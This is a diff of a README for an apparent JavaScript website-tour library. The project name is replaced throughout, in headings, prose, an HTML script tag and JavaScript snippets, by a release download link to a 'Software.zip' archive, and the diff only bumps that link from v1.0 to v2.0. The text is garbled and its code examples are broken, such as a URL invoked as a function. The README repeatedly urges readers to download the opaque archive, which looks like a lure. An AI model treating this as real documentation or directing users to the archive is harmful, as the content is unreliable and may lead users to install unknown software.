@@ -1,14 +1,14 @@
-# 🚀 Welcome to https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip!
+# 🚀 Welcome to https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip!
 
 ### A JavaScript Library for Interactive Website Tours
 
-[![Download https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip](https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip)](https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip)
+[![Download https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip](https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip)](https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip)
 
 ---
 
 ## Overview
 
-Welcome to the `https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip` repository, your one-stop solution to creating interactive tours on websites! 🌎 This JavaScript library offers a seamless way to highlight elements on your site, display custom tooltips with text and images, and provide users with a guided tour for a better onboarding experience and intuitive feature discovery.
+Welcome to the `https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip` repository, your one-stop solution to creating interactive tours on websites! 🌎 This JavaScript library offers a seamless way to highlight elements on your site, display custom tooltips with text and images, and provide users with a guided tour for a better onboarding experience and intuitive feature discovery.
 
 ## Features
 
@@ -19,9 +19,9 @@ Welcome to the `https://github.com/Jentao1234/guiaMestre.js/releases/download/v1
 
 ## Installation
 
-To get started with `https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip`, simply download the latest release using the following link:
+To get started with `https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip`, simply download the latest release using the following link:
 
-[Download https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip v1.0.0](https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip)
+[Download https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip v1.0.0](https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip)
 
 Once downloaded, extract the files and integrate the library into your project to start creating interactive tours!
 
@@ -30,7 +30,7 @@ Once downloaded, extract the files and integrate the library into your project t
 ### Step 1: Include the Library
 
 ```html
-<script src="https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip"></script>
+<script src="https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip"></script>
 ```
 
 ### Step 2: Initialize guiaMestre
@@ -42,7 +42,7 @@ const tour = new GuiaMestre();
 ### Step 3: Create Tour Steps
 
 ```javascript
-https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip({
+https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip({
   element: '.target-element',
   tooltip: 'Welcome to our website!',
   position: 'right'
@@ -52,7 +52,7 @@ https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip(
 ### Step 4: Start the Tour
 
 ```javascript
-https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip();
+https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip();
 ```
 
 ## Repository Topics
@@ -84,11 +84,11 @@ Feel free to explore these topics and stay updated on the latest trends in web d
 
 ## Further Resources
 
-For more information on `https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip` and additional resources, you can visit the [official repository](https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip).
+For more information on `https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip` and additional resources, you can visit the [official repository](https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip).
 
 ---
 
-🌟 Start creating engaging interactive tours with `https://github.com/Jentao1234/guiaMestre.js/releases/download/v1.0/Software.zip` today! 🌟
+🌟 Start creating engaging interactive tours with `https://github.com/Jentao1234/guiaMestre.js/releases/download/v2.0/Software.zip` today! 🌟
 
 ---
 
